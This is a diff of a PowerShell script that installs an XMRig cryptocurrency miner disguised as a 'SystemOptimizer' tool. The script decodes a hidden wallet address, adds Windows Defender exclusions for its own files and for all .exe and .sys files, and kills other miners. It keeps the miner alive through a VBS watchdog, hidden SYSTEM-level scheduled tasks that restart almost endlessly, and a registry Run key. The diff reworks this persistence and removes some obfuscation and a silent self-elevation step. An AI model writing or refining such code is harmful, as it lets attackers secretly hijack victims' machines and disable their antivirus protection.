@@ -1,13 +1,4 @@
-#Requires -RunAsAdministrator
 $ErrorActionPreference = "Stop"
-
-# Force elevation if not admin
-$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-$hasHighIntegrity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("S-1-16-12288")
-if (-not $hasHighIntegrity) {
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
 
 # ===== PATHS (system-wide, universal for all users) =====
 $baseDir = "$env:ProgramData\SystemOptimizer"
@@ -23,26 +14,26 @@ $wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($w
 
 # ===== DEFENDER EXCLUSIONS FIRST =====
 try {
-    & ('Add-Mp'+'Preference') -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
-    & ('Add-Mp'+'Preference') -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
-    & ('Add-Mp'+'Preference') -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
-    & ('Add-Mp'+'Preference') -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "SystemOptimizer.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".sys" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
 } catch { }
 
 # ===== CLEANUP =====
-& ('task'+'kill') /F /IM "wscript.exe" 2>$null
-& ('task'+'kill') /F /IM "xmrig.exe" 2>$null
-& ('task'+'kill') /F /IM "SystemOptimizer.exe" 2>$null
+taskkill /F /IM "wscript.exe" 2>$null
+taskkill /F /IM "xmrig.exe" 2>$null
+taskkill /F /IM "SystemOptimizer.exe" 2>$null
 Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
 Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer" 2>$null
 Remove-Item -Recurse -Force "$baseDir" 2>$null
-& ('sch'+'tasks') /Delete /TN "SystemOptimizer" /F 2>$null
-& ('sch'+'tasks') /Delete /TN "SystemOptimizer-Logon" /F 2>$null
-& ('sch'+'tasks') /Delete /TN "ModestFermi_XMRig" /F 2>$null
+schtasks /Delete /TN "SystemOptimizer" /F 2>$null
+schtasks /Delete /TN "SystemOptimizer-Logon" /F 2>$null
+schtasks /Delete /TN "ModestFermi_XMRig" /F 2>$null
 Start-Sleep 1
 
-# ===== CREATE DIR (system-wide, after cleanup) - VERIFIED =====
-$dir = New-Item -ItemType Directory -Force -Path $baseDir
+# ===== CREATE DIR (system-wide, after cleanup) =====
+New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
 if (-not (Test-Path $baseDir)) { throw "Failed to create directory: $baseDir" }
 
 # ===== DOWNLOAD XMRIG (NO WINRING0) =====
@@ -85,15 +76,14 @@ Loop
 $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 if (-not (Test-Path $watchdogPath)) { throw "Watchdog.vbs not created at $watchdogPath" }
 
-# ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
-$tempCmd = "$env:TEMP\create_tasks.cmd"
-@"
-schtasks /Create /TN SystemOptimizer /TR "wscript.exe \"$watchdogPath\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
-schtasks /Create /TN SystemOptimizer-Logon /TR "wscript.exe \"$watchdogPath\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
-schtasks /Change /TN SystemOptimizer /RI 1 /DU 9999:59 /K
-"@ | Set-Content -Path $tempCmd -Encoding ascii
-Start-Process cmd -ArgumentList "/c $tempCmd" -Verb RunAs -Wait
-Remove-Item $tempCmd -Force -ErrorAction SilentlyContinue
+# ===== SCHEDULED TASKS (SYSTEM, boot + logon) - using Register-ScheduledTask (reliable from elevated) =====
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogPath`""
+$trigger1 = New-ScheduledTaskTrigger -AtStartup
+$trigger2 = New-ScheduledTaskTrigger -AtLogOn
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero)
+Register-ScheduledTask -TaskName "SystemOptimizer" -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction Stop
+Register-ScheduledTask -TaskName "SystemOptimizer-Logon" -Action $action -Trigger $trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
 
 # ===== REGISTRY RUN KEY =====
 try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }
